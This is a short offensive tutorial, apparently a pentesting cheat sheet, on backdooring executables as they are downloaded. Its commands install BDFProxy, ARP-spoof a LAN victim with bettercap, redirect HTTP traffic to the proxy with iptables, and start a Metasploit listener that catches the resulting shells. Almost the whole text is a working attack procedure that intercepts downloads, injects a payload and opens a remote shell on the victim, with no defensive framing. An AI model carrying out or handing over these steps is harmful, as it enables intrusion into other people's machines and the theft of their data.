# Backdoor exe on the fly

The method of the delivery method is to backdoor files that is downloading from a source to victim's machine. If hacker become man-in-the-middle, the victim downloads executable from a http site, hacker backdoors it. As target execute, the hacker got a shell

                 backdoored exe               original exe
     Victim <-------------------- Hacker <--------------------  Source

     Bkd client -------------> running server
	                 connect

Run:

    cd /opt
    git clone https://github.com/secretsquirrel/BDFProxy.git
    cd BDFProxy
    ./install.sh
    apt -y install python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev zlib1g-dev
    pip install capstone mitmproxy==0.13

Configure BDFProxy:

    cd /opt/BDFProxy
    vim bdfproxy.cfg

Change the following to: 
    
    proxyMode = transparent

Find config of each os:

    Host = <ip>

Execute bdfproxy.py

    python bdf_proxy.py

or

    ./bdf_proxy.py


Performing MITM attack:

    bettercap -iface <interface> -caplet <yourscript>

    net.probe                                    # probing net requests
    net.show                                     # show every host on LAN
    set arp.spoof.targets <target ip>            # Setting the victim
    set arp.spoof.fullduplex true                # Setting to spoof on two sides
    arp.spoof on                                 # enabling spoofing

Redirect received port to bdf_proxy.py:

    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

Running the listener:

    msfconsole --resource /opt/BDFproxy/bdfproxy_msf_resource.rc

    sessions -l            # list all active sessions
    sessions -i <id>       # Interact with a session with <id>

    sysinfo                # check system information
    help                   # show list of commands
